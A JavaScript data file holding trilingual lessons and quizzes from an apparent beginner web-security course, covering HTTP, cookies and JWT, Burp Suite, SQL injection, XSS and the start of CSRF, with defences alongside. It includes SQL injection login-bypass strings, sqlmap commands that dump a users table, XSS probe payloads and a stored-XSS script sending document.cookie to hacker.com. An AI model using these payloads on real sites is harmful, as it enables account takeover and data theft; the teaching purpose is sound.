// ============================================================
//  LEVEL 2 — O'RTA | СРЕДНИЙ | INTERMEDIATE  (2-oy)
//  4 hafta × 3 dars = 12 dars
// ============================================================
module.exports = [
  // ─────────────────────────────────────────────
  //  KURS 5 — 5-hafta: Web Xavfsizligi Asoslari
  // ─────────────────────────────────────────────
  {
    id:"c2w5", level:2, week:5, icon:"🕸️", color:"#00aaff",
    title:{ uz:"Web Xavfsizligi Asoslari", ru:"Основы веб-безопасности", en:"Web Security Basics" },
    desc:{ uz:"Saytlar qanday ishlaydi, HTTP metodlari, cookie va sessionlar — zaifliklarni tushunishdan oldin", ru:"Как работают сайты, HTTP методы, cookie и сессии — перед пониманием уязвимостей", en:"How websites work, HTTP methods, cookies and sessions — before understanding vulnerabilities" },
    duration:{ uz:"3 × 30 daqiqa", ru:"3 × 30 минут", en:"3 × 30 minutes" },
    lessons:[
      {
        id:"c2w5l1",
        title:{ uz:"Saytlar qanday ishlaydi?", ru:"Как работают сайты?", en:"How do websites work?" },
        duration:"30 daq",
        content:{
          uz:`<h2>Saytlar qanday ishlaydi?</h2>
<p>Web saytga hujum qilishdan oldin u qanday ishlashini tushunish kerak. Bu — eng muhim qadam!</p>
<h3>🏗️ Web ilovaning 3 qatlami</h3>
<div class="info-box">
<p><strong>Frontend (Mijoz tomoni):</strong> Brauzerda ishlaydigan narsa — HTML, CSS, JavaScript. Foydalanuvchi ko'radigan va boshqaradigan qism.</p>
<p><strong>Backend (Server tomoni):</strong> Serverda ishlaydigan kod — PHP, Python, Node.js, Java. Ma'lumotni qayta ishlaydi.</p>
<p><strong>Database (Ma'lumotlar bazasi):</strong> Ma'lumot saqlanadigan joy — MySQL, PostgreSQL, MongoDB.</p>
</div>
<h3>📡 HTTP so'rov va javob</h3>
<pre><code># Brauzer serverga SO'ROV yuboradi:
GET /index.html HTTP/1.1
Host: example.com
Cookie: session=abc123
User-Agent: Chrome/120

# Server JAVOB beradi:
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz789

&lt;!DOCTYPE html&gt;
&lt;html&gt;...sahifa kodi...&lt;/html&gt;</code></pre>
<h3>🔑 HTTP metodlari</h3>
<div class="info-box">
<p><strong>GET</strong> — Ma'lumot olish (sahifa ochish, qidirish)</p>
<p><strong>POST</strong> — Ma'lumot yuborish (ro'yxatdan o'tish, login)</p>
<p><strong>PUT</strong> — Ma'lumotni yangilash</p>
<p><strong>DELETE</strong> — Ma'lumotni o'chirish</p>
<p><strong>PATCH</strong> — Qisman yangilash</p>
</div>
<h3>📊 HTTP status kodlari</h3>
<pre><code>200 OK              → Muvaffaqiyatli
301 Moved           → Doimiy yo'naltirish
302 Found           → Vaqtinchalik yo'naltirish
400 Bad Request     → Noto'g'ri so'rov
401 Unauthorized    → Autentifikatsiya kerak
403 Forbidden       → Ruxsat yo'q
404 Not Found       → Topilmadi
500 Server Error    → Server xatoligi

# Xavfsizlik nuqtai nazaridan:
403 → Sahifa bor, lekin kirish taqiqlangan (muhim!)
500 → Server kodi xatosi — stack trace ko'rinishi mumkin</code></pre>
<h3>🔍 Burp Suite bilan HTTP ni ko'rish</h3>
<p>Burp Suite — web pentesting ning asosiy vositasi. Brauzer va server o'rtasida "o'tiradi" va barcha trafik ni ko'radi/o'zgartiradi.</p>
<ul>
<li><strong>Proxy tab:</strong> Trafik ko'rish</li>
<li><strong>Repeater:</strong> So'rovni qayta yuborish va o'zgartirish</li>
<li><strong>Intruder:</strong> Avtomatik hujum</li>
<li><strong>Scanner:</strong> Zaifliklarni avtomatik topish</li>
</ul>`,
          ru:`<h2>Как работают сайты?</h2>
<p>Перед атакой на веб-сайт нужно понять как он работает. Это — самый важный шаг!</p>
<h3>🏗️ 3 уровня веб-приложения</h3>
<div class="info-box">
<p><strong>Frontend (Клиентская сторона):</strong> Работает в браузере — HTML, CSS, JavaScript. То, что видит и управляет пользователь.</p>
<p><strong>Backend (Серверная сторона):</strong> Код на сервере — PHP, Python, Node.js, Java. Обрабатывает данные.</p>
<p><strong>Database:</strong> Место хранения данных — MySQL, PostgreSQL, MongoDB.</p>
</div>
<h3>📡 HTTP запрос и ответ</h3>
<pre><code># Браузер отправляет ЗАПРОС серверу:
GET /index.html HTTP/1.1
Host: example.com
Cookie: session=abc123

# Сервер отвечает:
HTTP/1.1 200 OK
Content-Type: text/html

&lt;html&gt;...код страницы...&lt;/html&gt;</code></pre>
<h3>🔑 HTTP методы</h3>
<div class="info-box">
<p><strong>GET</strong> — Получить данные (открыть страницу, поиск)</p>
<p><strong>POST</strong> — Отправить данные (регистрация, логин)</p>
<p><strong>PUT</strong> — Обновить данные</p>
<p><strong>DELETE</strong> — Удалить данные</p>
</div>
<h3>📊 HTTP статус коды</h3>
<pre><code>200 OK              → Успешно
401 Unauthorized    → Нужна аутентификация
403 Forbidden       → Нет доступа
404 Not Found       → Не найдено
500 Server Error    → Ошибка сервера</code></pre>`,
          en:`<h2>How do websites work?</h2>
<p>Before attacking a website you need to understand how it works. This is the most important step!</p>
<h3>🏗️ 3 layers of a web application</h3>
<div class="info-box">
<p><strong>Frontend (Client side):</strong> Runs in the browser — HTML, CSS, JavaScript. What the user sees and interacts with.</p>
<p><strong>Backend (Server side):</strong> Code on the server — PHP, Python, Node.js, Java. Processes data.</p>
<p><strong>Database:</strong> Where data is stored — MySQL, PostgreSQL, MongoDB.</p>
</div>
<h3>📡 HTTP request and response</h3>
<pre><code># Browser sends REQUEST to server:
GET /index.html HTTP/1.1
Host: example.com
Cookie: session=abc123

# Server RESPONDS:
HTTP/1.1 200 OK
Content-Type: text/html

&lt;html&gt;...page code...&lt;/html&gt;</code></pre>
<h3>📊 HTTP status codes</h3>
<pre><code>200 OK              → Success
401 Unauthorized    → Auth needed
403 Forbidden       → No access
404 Not Found       → Not found
500 Server Error    → Server crashed</code></pre>`
        },
        quiz:[
          { q:{uz:"POST metodi odatda nima uchun ishlatiladi?",ru:"Для чего обычно используется метод POST?",en:"What is the POST method typically used for?"},
            options:{uz:["Sahifa ochish","Ma'lumot yuborish (login, ro'yxat)","Faylni o'chirish","Sahifani yangilash"],ru:["Открыть страницу","Отправить данные (логин, регистрация)","Удалить файл","Обновить страницу"],en:["Open a page","Send data (login, register)","Delete a file","Refresh page"]}, answer:1 },
          { q:{uz:"HTTP 403 kodi nima degani?",ru:"Что означает HTTP код 403?",en:"What does HTTP code 403 mean?"},
            options:{uz:["Sahifa topilmadi","Muvaffaqiyatli","Ruxsat yo'q","Server xatoligi"],ru:["Страница не найдена","Успешно","Нет доступа","Ошибка сервера"],en:["Page not found","Successful","Access forbidden","Server error"]}, answer:2 }
        ]
      },
      {
        id:"c2w5l2",
        title:{ uz:"Cookie, Session va JWT", ru:"Cookie, Session и JWT", en:"Cookies, Sessions and JWT" },
        duration:"30 daq",
        content:{
          uz:`<h2>Cookie, Session va JWT</h2>
<p>Saytlar sizni kimligingizni qanday eslab qoladi? Har safar sahifa ochganda qayta login qilmaymiz — bu qanday ishlaydi?</p>
<h3>🍪 Cookie nima?</h3>
<p>Cookie — server brauzeringizga saqlaydigan kichik matn parchasi. Keyingi so'rovda brauzer uni avtomatik yuboradi.</p>
<pre><code># Server cookie o'rnatadi:
Set-Cookie: username=ali; Expires=Fri, 31 Dec 2024; Path=/

# Brauzer keyingi so'rovda yuboradi:
Cookie: username=ali

# Cookie xususiyatlari:
HttpOnly   → JavaScript o'qiy olmaydi (XSS dan himoya)
Secure     → Faqat HTTPS da yuboriladi
SameSite   → CSRF dan himoya
Expires    → Muddati</code></pre>
<h3>🔐 Session qanday ishlaydi?</h3>
<div class="info-box">
<p><strong>Session — server tomonida saqlanadi:</strong></p>
<p>1. Login qilasiz → server sessiya yaratadi, ID beradi</p>
<p>2. Server ID ni cookie ga saqlaydi: <code>session_id=abc123xyz</code></p>
<p>3. Keyingi so'rovda cookie yuborasiz → server ID ni tanib, kim ekanligingizni biladi</p>
</div>
<pre><code># Session ID o'g'irlash → Session Hijacking:
1. Hujumchi session ID ni ushlaydi (MITM, XSS)
2. O'sha ID bilan so'rov yuboradi
3. Server uni siz deb o'ylaydi!

# Himoya: HttpOnly, Secure cookie + HTTPS</code></pre>
<h3>🎫 JWT (JSON Web Token)</h3>
<p>Zamonaviy API lar session o'rniga JWT ishlatadi:</p>
<pre><code># JWT tuzilmasi (3 qism, nuqta bilan ajralgan):
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpIn0.signature
└─────────────────┘ └──────────────────┘ └────────┘
     Header              Payload           Signature
  (algoritm)          (ma'lumot)        (imzo)

# Payload ni decode qilish (base64):
{"user":"ali","role":"admin","exp":1704067200}

# Xavf: Agar imzo zaif bo'lsa — payload o'zgartirish mumkin!
# role: "user" → role: "admin"</code></pre>
<h3>🔒 Xavfsizlik maslahatlar</h3>
<ul>
<li>Session ID lar uzoq va tasodifiy bo'lsin</li>
<li>HttpOnly va Secure flaglar o'rnatilsin</li>
<li>Session vaqt bo'yicha tugasin (timeout)</li>
<li>Logout da session o'chirilsin</li>
<li>JWT da kuchli imzolash algoritmi (RS256)</li>
</ul>`,
          ru:`<h2>Cookie, Session и JWT</h2>
<p>Как сайты запоминают кто вы? Мы не логинимся каждый раз при открытии страницы — как это работает?</p>
<h3>🍪 Что такое Cookie?</h3>
<pre><code># Сервер устанавливает cookie:
Set-Cookie: username=ivan; HttpOnly; Secure; SameSite=Strict

# Браузер отправляет в следующем запросе:
Cookie: username=ivan

# Атрибуты безопасности:
HttpOnly   → JavaScript не может читать (защита от XSS)
Secure     → Только через HTTPS
SameSite   → Защита от CSRF</code></pre>
<h3>🔐 Как работает Session?</h3>
<div class="info-box">
<p>1. Вы логинитесь → сервер создаёт сессию, даёт ID</p>
<p>2. Сервер сохраняет ID в cookie: <code>session_id=abc123</code></p>
<p>3. В следующем запросе браузер отправляет cookie → сервер знает кто вы</p>
</div>
<h3>🎫 JWT (JSON Web Token)</h3>
<pre><code># Структура JWT (3 части через точку):
header.payload.signature

# Payload (base64 decode):
{"user":"ivan","role":"admin","exp":1704067200}

# Риск: если подпись слабая — payload можно изменить!
# role: "user" → role: "admin"</code></pre>`,
          en:`<h2>Cookies, Sessions and JWT</h2>
<p>How do websites remember who you are? We don't re-login on every page open — how does this work?</p>
<h3>🍪 What is a Cookie?</h3>
<pre><code># Server sets a cookie:
Set-Cookie: username=alice; HttpOnly; Secure; SameSite=Strict

# Browser sends it in the next request:
Cookie: username=alice

# Security attributes:
HttpOnly   → JavaScript can't read it (XSS protection)
Secure     → HTTPS only
SameSite   → CSRF protection</code></pre>
<h3>🔐 How Sessions work</h3>
<div class="info-box">
<p>1. You log in → server creates a session, issues an ID</p>
<p>2. Server saves ID in cookie: <code>session_id=abc123</code></p>
<p>3. Next request sends cookie → server knows who you are</p>
</div>
<h3>🎫 JWT (JSON Web Token)</h3>
<pre><code># JWT structure (3 parts, dot-separated):
header.payload.signature

# Payload (base64 decoded):
{"user":"alice","role":"admin","exp":1704067200}

# Risk: if signature is weak — payload can be altered!
# role: "user" → role: "admin"</code></pre>`
        },
        quiz:[
          { q:{uz:"HttpOnly cookie xususiyati nimadan himoya qiladi?",ru:"От чего защищает атрибут HttpOnly у cookie?",en:"What does the HttpOnly cookie attribute protect against?"},
            options:{uz:["SQL Injection","XSS (JavaScript orqali cookie o'g'irlash)","CSRF hujum","Brute force"],ru:["SQL инъекции","XSS (кража cookie через JavaScript)","CSRF атаку","Brute force"],en:["SQL Injection","XSS (stealing cookies via JavaScript)","CSRF attack","Brute force"]}, answer:1 },
          { q:{uz:"JWT da eng katta xavf nima?",ru:"В чём главный риск JWT?",en:"What is the main risk with JWT?"},
            options:{uz:["Juda katta hajm","Zaif imzo bilan payload o'zgartirilishi mumkin","Tezligi sekin","Cookie bilan mos kelmaydi"],ru:["Очень большой размер","Слабая подпись позволяет изменить payload","Медленная скорость","Несовместим с cookie"],en:["Very large size","Weak signature allows payload alteration","Slow speed","Incompatible with cookies"]}, answer:1 }
        ]
      },
      {
        id:"c2w5l3",
        title:{ uz:"Burp Suite bilan tanishish", ru:"Знакомство с Burp Suite", en:"Introduction to Burp Suite" },
        duration:"35 daq",
        content:{
          uz:`<h2>Burp Suite — Web Pentester ning Asosiy Quroli</h2>
<p>Burp Suite — web ilovalarni xavfsizlik sinovidan o'tkazish uchun eng mashhur vosita. Porsche Taycan kafedan Lamboghini ga o'tish kabi — darajangiz keskin oshadi.</p>
<h3>⚙️ O'rnatish va sozlash</h3>
<ol>
<li>portswigger.net dan Burp Suite Community (bepul) yuklab oling</li>
<li>Ishga tushiring → "Temporary project" tanlang</li>
<li>Brauzer proxy sozlamalari: <code>127.0.0.1:8080</code></li>
<li>Burp Certificate ni brauzerga o'rnating (HTTPS uchun)</li>
</ol>
<h3>🔧 Asosiy funksiyalar</h3>
<div class="info-box">
<p><strong>Proxy → Intercept:</strong> Brauzer va server o'rtasidagi barcha trafik — ko'rish va o'zgartirish</p>
<p><strong>Proxy → HTTP History:</strong> Barcha o'tgan so'rovlar arxivi</p>
<p><strong>Repeater:</strong> So'rovni qayta-qayta yuborish, parametrlarni o'zgartirish</p>
<p><strong>Intruder:</strong> Avtomatik hujum — wordlist bilan brute force</p>
<p><strong>Scanner (Pro):</strong> Zaifliklarni avtomatik aniqlash</p>
<p><strong>Decoder:</strong> Base64, URL encoding, hex konversiya</p>
</div>
<h3>🎯 Amaliy: So'rovni ushlash va o'zgartirish</h3>
<pre><code># 1. Intercept: ON qiling
# 2. Brauzerda login saytiga kiring
# 3. Burp so'rovni ushlab qoladi:

POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=ali&password=12345

# 4. "Send to Repeater" (Ctrl+R)
# 5. Repeater da parametrlarni o'zgartiring
# 6. "Send" → javobni o'rganing</code></pre>
<h3>🔍 Foydali Burp Suite texnikalar</h3>
<pre><code># URL Encoding va Decoding
%27 → ' (apostrof) — SQL injection uchun muhim!
%3C → <
%3E → >
%20 → bo'sh joy

# Burp Decoder da:
Text → Decode as → URL
eyJhbGci → Decode as → Base64 (JWT header!)</code></pre>
<h3>💡 Maslahat: OWASP Juice Shop</h3>
<p>OWASP Juice Shop — ataylab zaif qilingan veb ilova. Burp Suite bilan unga hujum qilishni mashq qiling. 100% qonuniy!</p>
<pre><code># Docker bilan o'rnatish:
docker run -p 3000:3000 bkimminich/juice-shop

# Yoki: juice-shop.herokuapp.com (onlayn demo)</code></pre>`,
          ru:`<h2>Burp Suite — Главный инструмент веб-пентестера</h2>
<p>Burp Suite — самый популярный инструмент для тестирования безопасности веб-приложений.</p>
<h3>⚙️ Установка и настройка</h3>
<ol>
<li>Скачайте Burp Suite Community (бесплатно) с portswigger.net</li>
<li>Запустите → выберите "Temporary project"</li>
<li>Настройте прокси браузера: <code>127.0.0.1:8080</code></li>
<li>Установите сертификат Burp в браузер (для HTTPS)</li>
</ol>
<h3>🔧 Основные функции</h3>
<div class="info-box">
<p><strong>Proxy → Intercept:</strong> Весь трафик между браузером и сервером — просмотр и изменение</p>
<p><strong>Repeater:</strong> Многократная отправка запроса, изменение параметров</p>
<p><strong>Intruder:</strong> Автоматическая атака — brute force с wordlist</p>
<p><strong>Decoder:</strong> Конвертация Base64, URL encoding, hex</p>
</div>
<h3>🎯 Практика: Перехват и изменение запроса</h3>
<pre><code># 1. Включите Intercept
# 2. Войдите на сайт логина в браузере
# 3. Burp перехватит запрос:

POST /login HTTP/1.1
username=ivan&password=12345

# 4. "Send to Repeater" (Ctrl+R)
# 5. Измените параметры → Send</code></pre>`,
          en:`<h2>Burp Suite — The Web Pentester's Main Tool</h2>
<p>Burp Suite is the most popular tool for testing web application security.</p>
<h3>⚙️ Installation and setup</h3>
<ol>
<li>Download Burp Suite Community (free) from portswigger.net</li>
<li>Launch → select "Temporary project"</li>
<li>Set browser proxy: <code>127.0.0.1:8080</code></li>
<li>Install Burp certificate in browser (for HTTPS)</li>
</ol>
<h3>🔧 Core features</h3>
<div class="info-box">
<p><strong>Proxy → Intercept:</strong> All traffic between browser and server — view and modify</p>
<p><strong>Repeater:</strong> Resend requests repeatedly, change parameters</p>
<p><strong>Intruder:</strong> Automated attacks — brute force with wordlists</p>
<p><strong>Decoder:</strong> Base64, URL encoding, hex conversion</p>
</div>
<h3>🎯 Practice: Intercept and modify a request</h3>
<pre><code># 1. Turn on Intercept
# 2. Go to a login page in browser
# 3. Burp captures the request:

POST /login HTTP/1.1
username=alice&password=12345

# 4. Send to Repeater (Ctrl+R)
# 5. Change parameters → Send → study response</code></pre>`
        },
        quiz:[
          { q:{uz:"Burp Suite Repeater nima uchun ishlatiladi?",ru:"Для чего используется Burp Suite Repeater?",en:"What is Burp Suite Repeater used for?"},
            options:{uz:["Dastur o'rnatish","So'rovlarni qayta-qayta yuborish va o'zgartirish","Fayl ko'chirish","Tarmoqni skanerlash"],ru:["Установка программ","Повторная отправка и изменение запросов","Копирование файлов","Сканирование сети"],en:["Installing programs","Resending and modifying requests","Copying files","Network scanning"]}, answer:1 },
          { q:{uz:"%27 URL encoding da nimani anglatadi?",ru:"Что означает %27 в URL encoding?",en:"What does %27 mean in URL encoding?"},
            options:{uz:["Bo'sh joy","Apostrof (') — SQL injection uchun muhim","Raqam 27","Maxsus belgi @"],ru:["Пробел","Апостроф (') — важен для SQL инъекции","Число 27","Спецсимвол @"],en:["Space","Apostrophe (') — important for SQL injection","Number 27","Special char @"]}, answer:1 }
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  //  KURS 6 — 6-hafta: Web Hujumlar
  // ─────────────────────────────────────────────
  {
    id:"c2w6", level:2, week:6, icon:"💉", color:"#ff4444",
    title:{ uz:"Web Hujumlar: SQLi, XSS, CSRF", ru:"Веб-атаки: SQLi, XSS, CSRF", en:"Web Attacks: SQLi, XSS, CSRF" },
    desc:{ uz:"OWASP Top 10 ning eng xavfli 3 ta hujumi — qanday ishlaydi va qanday himoyalanish", ru:"3 самые опасные атаки из OWASP Top 10 — как работают и как защититься", en:"3 most dangerous attacks from OWASP Top 10 — how they work and how to defend" },
    duration:{ uz:"3 × 35 daqiqa", ru:"3 × 35 минут", en:"3 × 35 minutes" },
    lessons:[
      {
        id:"c2w6l1",
        title:{ uz:"SQL Injection — ma'lumotlar bazasiga hujum", ru:"SQL Injection — атака на базу данных", en:"SQL Injection — database attack" },
        duration:"35 daq",
        content:{
          uz:`<h2>SQL Injection (SQLi)</h2>
<p>SQL Injection — 25 yildan ko'p vaqtdan beri OWASP Top 1 da turgan eng xavfli hujum. Bugun ham minglab saytlar shu zaiflikka ega!</p>
<h3>🎯 SQL Injection qanday ishlaydi?</h3>
<p>Sayt foydalanuvchi kiritgan ma'lumotni SQL so'rovga qo'shsa, hujumchi o'z SQL kodini kiritishi mumkin.</p>
<pre><code># Zaif PHP kod:
$query = "SELECT * FROM users WHERE name='" . $_GET['name'] . "'";

# Oddiy so'rov:
name = ali
SQL: SELECT * FROM users WHERE name='ali'

# Hujum: SQL kodini kiritamiz
name = ' OR '1'='1
SQL: SELECT * FROM users WHERE name='' OR '1'='1'
# '1'='1' har doim true → BARCHA foydalanuvchilar!

# Yanada xavflisi: admin parolini olish
name = admin' --
SQL: SELECT * FROM users WHERE name='admin' --'
# -- dan keyin hammasini e'tiborsiz qoldiradi
# Parolsiz admin bo'lib kiramiz!</code></pre>
<h3>🔍 SQLi turlari</h3>
<div class="info-box">
<p><strong>In-band (Ko'rinadigan):</strong> Natija to'g'ridan-to'g'ri sahifada ko'rinadi. Eng oddiy.</p>
<p><strong>Blind (Ko'rinmas):</strong> Natija ko'rinmaydi, lekin sayt xatti-harakati orqali ma'lumot olinadi. True/False savollari.</p>
<p><strong>Time-based:</strong> Server javob vaqtiga qarab ma'lumot olinadi. <code>SLEEP(5)</code></p>
<p><strong>Out-of-band:</strong> DNS yoki HTTP orqali ma'lumot chiqariladi.</p>
</div>
<h3>🛠️ SQLMap — avtomatik SQLi vositasi</h3>
<pre><code># Zaif URL ni tekshirish
sqlmap -u "http://target.com/page?id=1"

# Database nomlarini olish
sqlmap -u "http://target.com/page?id=1" --dbs

# Jadvallarni olish
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Ustunlarni olish
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns

# Ma'lumotlarni olish
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump</code></pre>
<h3>🛡️ SQLi dan himoya</h3>
<pre><code># ❌ Zaif (hech qachon ishlatmang):
query = "SELECT * FROM users WHERE id=" + user_input

# ✅ Xavfsiz — Prepared Statements:
# Python:
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))

# PHP:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_input]);

# Node.js:
db.query("SELECT * FROM users WHERE id = ?", [userId]);

# + ORM ishlatish (SQLAlchemy, Hibernate, Prisma)
# + Input validation
# + WAF (Web Application Firewall)</code></pre>`,
          ru:`<h2>SQL Injection (SQLi)</h2>
<p>SQL Injection — самая опасная атака, занимающая OWASP Top 1 уже более 25 лет. Тысячи сайтов до сих пор уязвимы!</p>
<h3>🎯 Как работает SQL Injection?</h3>
<pre><code># Уязвимый PHP код:
$query = "SELECT * FROM users WHERE name='" . $_GET['name'] . "'";

# Обычный запрос:
name = ivan → SELECT * FROM users WHERE name='ivan'

# Атака:
name = ' OR '1'='1
SQL: SELECT * FROM users WHERE name='' OR '1'='1'
# Возвращает всех пользователей!

# Ещё опаснее: войти как admin без пароля
name = admin' --
SQL: SELECT * FROM users WHERE name='admin' --'</code></pre>
<h3>🛡️ Защита от SQLi</h3>
<pre><code># ❌ Уязвимо:
query = "SELECT * FROM users WHERE id=" + user_input

# ✅ Безопасно — Prepared Statements:
# Python:
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))

# PHP:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_input]);</code></pre>`,
          en:`<h2>SQL Injection (SQLi)</h2>
<p>SQL Injection has been in OWASP Top 1 for over 25 years. Thousands of sites are still vulnerable!</p>
<h3>🎯 How SQL Injection works</h3>
<pre><code># Vulnerable PHP code:
$query = "SELECT * FROM users WHERE name='" . $_GET['name'] . "'";

# Normal query:
name = alice → SELECT * FROM users WHERE name='alice'

# Attack:
name = ' OR '1'='1
SQL: WHERE name='' OR '1'='1'  → returns ALL users!

# Login as admin without password:
name = admin' --
SQL: WHERE name='admin' --'  → comment drops the rest!</code></pre>
<h3>🛡️ SQLi defenses</h3>
<pre><code># ❌ Vulnerable:
query = "SELECT * FROM users WHERE id=" + user_input

# ✅ Safe — Prepared Statements:
# Python:
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))

# PHP:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_input]);</code></pre>`
        },
        quiz:[
          { q:{uz:"SQL Injection da ' OR '1'='1 nima uchun ishlaydi?",ru:"Почему ' OR '1'='1 работает в SQL Injection?",en:"Why does ' OR '1'='1 work in SQL Injection?"},
            options:{uz:["Server xatoligi","'1'='1' har doim true — barcha satrlar qaytariladi","Parol to'g'ri","Admin huquqi beriladi"],ru:["Ошибка сервера","'1'='1' всегда true — возвращаются все строки","Пароль верный","Дают права admin"],en:["Server error","'1'='1' is always true — all rows returned","Password is correct","Admin rights granted"]}, answer:1 },
          { q:{uz:"SQLi dan himoyalanishning eng yaxshi usuli?",ru:"Лучший способ защиты от SQLi?",en:"Best defense against SQLi?"},
            options:{uz:["Input ni kalta qilish","Prepared Statements ishlatish","Faqat POST ishlatish","SSL sertifikat o'rnatish"],ru:["Сократить ввод","Использовать Prepared Statements","Использовать только POST","Установить SSL сертификат"],en:["Limit input length","Use Prepared Statements","Use POST only","Install SSL certificate"]}, answer:1 }
        ]
      },
      {
        id:"c2w6l2",
        title:{ uz:"XSS — Cross-Site Scripting", ru:"XSS — межсайтовый скриптинг", en:"XSS — Cross-Site Scripting" },
        duration:"35 daq",
        content:{
          uz:`<h2>XSS — Cross-Site Scripting</h2>
<p>XSS — hujumchi boshqa foydalanuvchilarning brauzerida o'z JavaScript kodini ishlatadi. Bu sayt uchun emas, foydalanuvchilar uchun xavfli!</p>
<h3>🎭 XSS turlari</h3>
<div class="info-box">
<p><strong>Reflected XSS:</strong> Zararli kod URL da — foydalanuvchi havolani bosishi kerak.</p>
<p><strong>Stored XSS:</strong> Zararli kod bazada saqlanadi — har kim ko'rganda ishga tushadi. ENG XAVFLISI!</p>
<p><strong>DOM-based XSS:</strong> Serverga bormasdan brauzerda sodir bo'ladi.</p>
</div>
<h3>🎯 XSS qanday ishlaydi?</h3>
<pre><code># Zaif sayt kodi (PHP):
echo "Salom, " . $_GET['name'];

# Oddiy so'rov:
?name=Ali → Salom, Ali

# XSS hujumi:
?name=&lt;script&gt;alert('XSS!')&lt;/script&gt;
→ Brauzer scriptni ishlatadi!

# Stored XSS (yanada xavfliroq):
# Izoh yozish maydoniga:
&lt;script&gt;
  // Cookie o'g'irlash
  fetch('https://hacker.com/steal?cookie='+document.cookie)
&lt;/script&gt;
# Bu izoh bazada saqlanadi
# Har kim ko'rganda hacker.com ga cookie yuboriladi!</code></pre>
<h3>💣 XSS bilan nima qilish mumkin?</h3>
<ul>
<li>Cookie/Session o'g'irlash (session hijacking)</li>
<li>Keylogger — bosilgan tugmalarni yozish</li>
<li>Sahifani o'zgartirish (defacement)</li>
<li>Foydalanuvchini boshqa saytga yo'naltirish</li>
<li>Phishing formasi ko'rsatish</li>
</ul>
<h3>🛡️ XSS dan himoya</h3>
<pre><code># 1. Output escaping (ENG MUHIM):
# PHP:
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

# JavaScript:
element.textContent = userInput;  // innerHTML emas!

# 2. Content Security Policy (CSP) header:
Content-Security-Policy: default-src 'self'; script-src 'self'
# Bu tashqi skriptlarni bloklaydi

# 3. HttpOnly cookie → JavaScript o'qiy olmaydi

# 4. Input validation:
# Faqat kutilgan formatni qabul qiling
# Email → @ va . bo'lsin
# Raqam → faqat raqam bo'lsin</code></pre>
<h3>🔍 XSS ni qanday topish?</h3>
<pre><code># Har bir input maydoniga sinab ko'ring:
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
"&gt;&lt;script&gt;alert(1)&lt;/script&gt;

# Burp Suite Scanner
# OWASP ZAP avtomatik skan</code></pre>`,
          ru:`<h2>XSS — межсайтовый скриптинг</h2>
<p>XSS — атакующий запускает свой JavaScript код в браузере других пользователей.</p>
<h3>🎯 Как работает XSS?</h3>
<pre><code># Уязвимый PHP код:
echo "Привет, " . $_GET['name'];

# Атака:
?name=&lt;script&gt;alert('XSS!')&lt;/script&gt;

# Stored XSS (самый опасный):
&lt;script&gt;
  // Кража cookie:
  fetch('https://hacker.com/steal?c='+document.cookie)
&lt;/script&gt;
# Сохраняется в базе — работает у всех посетителей!</code></pre>
<h3>🛡️ Защита от XSS</h3>
<pre><code># 1. Экранирование вывода:
# PHP:
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

# JavaScript:
element.textContent = userInput;  // не innerHTML!

# 2. CSP заголовок:
Content-Security-Policy: default-src 'self'

# 3. HttpOnly cookie</code></pre>`,
          en:`<h2>XSS — Cross-Site Scripting</h2>
<p>XSS — an attacker runs their own JavaScript in other users' browsers.</p>
<h3>🎯 How XSS works</h3>
<pre><code># Vulnerable PHP code:
echo "Hello, " . $_GET['name'];

# Attack:
?name=&lt;script&gt;alert('XSS!')&lt;/script&gt;

# Stored XSS (most dangerous):
&lt;script&gt;
  // Cookie theft:
  fetch('https://hacker.com/steal?c='+document.cookie)
&lt;/script&gt;
# Saved in database — runs for every visitor!</code></pre>
<h3>🛡️ XSS defenses</h3>
<pre><code># 1. Output escaping:
# PHP:
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

# JavaScript:
element.textContent = userInput;  // not innerHTML!

# 2. CSP header:
Content-Security-Policy: default-src 'self'

# 3. HttpOnly cookie</code></pre>`
        },
        quiz:[
          { q:{uz:"Stored XSS nima uchun eng xavfli?",ru:"Почему Stored XSS самый опасный?",en:"Why is Stored XSS most dangerous?"},
            options:{uz:["Tez ishlaydi","Bazada saqlanadi — har bir tashrif buyuruvchiga ta'sir qiladi","Server ni yiqitadi","Faqat adminlarga ta'sir qiladi"],ru:["Работает быстро","Хранится в базе — влияет на каждого посетителя","Ронит сервер","Влияет только на админов"],en:["Works fast","Stored in DB — affects every visitor","Crashes server","Only affects admins"]}, answer:1 },
          { q:{uz:"XSS dan himoyalanishda 'htmlspecialchars' nima qiladi?",ru:"Что делает 'htmlspecialchars' в защите от XSS?",en:"What does 'htmlspecialchars' do for XSS defense?"},
            options:{uz:["Parolni shifrlaydi","< > kabi belgilarni xavfsiz kodga aylantiradi","Faylni o'chiradi","Cookie ni o'chiradi"],ru:["Шифрует пароль","Преобразует < > в безопасный код","Удаляет файлы","Удаляет cookie"],en:["Encrypts password","Converts < > into safe code","Deletes files","Removes cookies"]}, answer:1 }
        ]
      },
      {
        id:"c2w6l3",
        title:{ uz:"CSRF va boshqa Web hujumlar", ru:"CSRF и другие веб-атаки", en:"CSRF and other web attacks" },
        duration:"35 daq",
        content:{
          uz:`<h2>CSRF va Boshqa Web Hujumlar</h2>
<h3>🎭 CSRF — Cross-Site Request Forgery</h3>
<p>CSRF — foydalanuvchi bilmagan holda o'zi kirgan saytda harakatlar bajarish. "Soxta buyruq".</p>
<pre><code># Stsenariy:
1. Siz bank.uz ga kirdingiz, session aktiv
2. Email dan soxta havola bosdingiz:
   http://evil.com/csrf_attack.html
3. Evil.com sahifasida yashirin forma:

&lt;form action="https://bank.uz/transfer" method="POST"&gt;
